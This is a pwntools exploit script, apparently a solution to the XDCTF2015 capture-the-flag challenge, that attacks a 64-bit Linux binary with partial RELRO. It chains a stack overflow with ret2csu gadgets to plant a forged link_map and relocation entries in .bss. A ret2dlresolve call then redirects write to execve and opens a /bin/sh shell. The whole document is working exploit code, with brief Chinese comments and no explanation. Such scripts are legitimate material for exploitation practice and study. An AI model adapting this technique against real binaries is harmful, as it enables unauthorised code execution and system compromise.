from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p   = process('./main_partial_relro_64')
elf = ELF('./main_partial_relro_64')
libc= ELF('/lib/x86_64-linux-gnu/libc.so.6')

def csu(fun, edi, rsi, rdx):
    payload = b''
    payload += p64(csu_part2)
    payload += p64(0)	# add rsp, 8
    payload += p64(0)	# pop rbx
    payload += p64(1)	# pop rbp
    payload += p64(fun)	# pop r12
    payload += p64(edi)	# pop r13
    payload += p64(rsi)	# pop r14
    payload += p64(rdx)	# pop r15
    payload += p64(csu_part1)
    payload += p64(0) * 7
    return payload

dl          = 0x400506
DT_STRTAB   = 0x600EA0
csu_part1	= 0x400780
csu_part2	= 0x400796
bss_addr	= elf.bss() + 0x30
read_got	= elf.got['read']
write_got   = elf.got['write']
vuln_addr	= elf.symbols['vuln']
offset		= libc.symbols['execve'] - libc.symbols['write']
l_addr      = offset

if l_addr < 0:  
   l_addr = l_addr + 0x10000000000000000

p.recvuntil('Welcome to XDCTF2015~!\n')

# 伪造各个节
payload1  = p64(6) + p64(write_got - 0x8 - 0x18)        # DT_SYMTAB
payload1 += p64(0x17) + p64(bss_addr + 0x8 * 4)         # JMPREL
payload1 += p64(write_got - offset) + p64(0x100000007) + p64(0) # Elf64_Rel
# 伪造link_map
payload2  = p64(l_addr)
payload2  = payload2.ljust(0x68, b'\x00')
payload2 += p64(DT_STRTAB)                              # 指向字符串表
payload2 += p64(bss_addr)                               # 指向伪造的Elf64_Sym
payload2  = payload2.ljust(0xF8, b'\x00')
payload2 += p64(bss_addr + 0x8 * 2)                     # 指向伪造的Elf64_Rel
# 合成最终payload
payload   = payload1 + payload2
payload   = payload.ljust(0x200, b'\x00')
payload  += b'/bin/sh\x00'

# 往bss中写入伪造数据
p.send(b'a' * 120 + csu(read_got, 0, bss_addr, len(payload)) + p64(vuln_addr))
p.send(payload)

# 调用_dl_resolve_call函数重定向write函数
p.send(b'a' * 120 + p64(dl) + p64(bss_addr + len(payload1)) + p64(0) + p64(vuln_addr))

# 执行strlen函数
p.send(b'a' * 120 + csu(write_got, bss_addr + 0x200, 0, 0) + p64(vuln_addr))

p.interactive()